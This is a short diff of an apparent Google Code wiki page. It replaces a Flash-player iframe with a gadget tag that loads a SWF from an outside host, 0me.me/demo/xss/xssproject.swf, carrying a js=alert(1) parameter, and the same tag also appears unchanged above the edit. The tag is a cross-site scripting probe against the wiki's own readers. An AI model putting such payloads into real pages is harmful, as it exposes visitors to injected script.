@@ -1,7 +1,7 @@
 <wiki:gadget url="https://ab56117cb9163641ca621ac5d4df8b73601b2f7a.googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml" height="200" border="0" up_File="https://0me.me/demo/xss/xssproject.swf?js=alert%281%29;" /> 
 
-<iframe allowtransparency="true" scrolling="no" frameborder="0" width="220" height="220" 
-src="http://www.gmodules.com/ig/ifr?url=https://googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml&up_File=https://googledrive.com/host/0B4yfJJJSNrfubzNjVFhHVm94TGM/bell-ross-blue.swf&up_FlashWidth=220&up_FlashHeight=220&up_ContainerCol=%23d1dae3">Lecteur Flash - http://www.liens-du-vin.ch/flash_container-script.htm</iframe>
+<wiki:gadget url="https://ab56117cb9163641ca621ac5d4df8b73601b2f7a.googledrive.com/host/0B4yfJJJSNrfubzJEUkxIYm1PcHM/flash-container.xml" height="200" border="0" up_File="https://0me.me/demo/xss/xssproject.swf?js=alert%281%29;" /> 
+
 
 
 <wiki:gadget url="http://google-code-project-hosting-gadgets.googlecode.com/svn/trunk/examples/issueupdates_example.xml" up_projectName="support" />
